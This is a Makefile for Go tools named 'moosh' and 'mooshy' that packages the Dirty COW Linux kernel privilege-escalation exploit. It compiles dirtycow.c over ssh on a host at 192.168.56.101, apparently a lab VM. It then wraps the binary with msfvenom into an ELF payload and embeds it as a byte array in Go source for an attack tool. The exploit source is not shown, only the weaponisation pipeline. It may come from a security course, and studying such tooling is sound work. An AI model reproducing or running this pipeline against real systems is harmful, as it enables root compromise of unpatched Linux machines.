BINDIR ?= bin
VUSER ?= "averagejoe"
VHOST ?= "192.168.56.101"

all: mooshy moosh

deps:
	@command -v dep > /dev/null || go get -u github.com/golang/dep/cmd/dep
	@dep ensure

vendor: deps

fmt:
	go fmt ./...

$(BINDIR)/cow: dirtycow/dirtycow.c
	@scp dirtycow/dirtycow.c $(VUSER)@$(VHOST):
	@ssh $(VUSER)@$(VHOST) gcc -pthread dirtycow.c -o cow
	@scp $(VUSER)@$(VHOST):cow $(BINDIR)/cow
	@ssh $(VUSER)@$(VHOST) rm -f dirtycow.c cow

cmd/moosh/cow.go: $(BINDIR)/cow
	@echo -ne "package main\n\nvar DirtyCow = []byte{$(shell cat $(BINDIR)/cow | msfvenom -p - -a x64 --platform linux -f elf | xxd -i)}" > cmd/moosh/cow.go
	@gofmt -w -s ./cmd/moosh/cow.go

$(BINDIR)/moosh: cmd/moosh/cow.go cmd/moosh/moosh.go vendor
	CGO_ENABLED=0 GOARCH=amd64 go build -o $(BINDIR)/moosh ./cmd/moosh

$(BINDIR)/mooshy: cmd/mooshy/mooshy.go vendor
	CGO_ENABLED=0 GOARCH=amd64 go build -o $(BINDIR)/mooshy ./cmd/mooshy

moosh: $(BINDIR)/moosh
mooshy: $(BINDIR)/mooshy
cow: cmd/moosh/cow.go

clean:
	rm -rf $(BINDIR)/{moosh,mooshy,cow} cmd/moosh/cow.go vendor

.SECONDARY: $(BINDIR)/cow
.PHONY: all deps mooshy moosh fmt cow clean
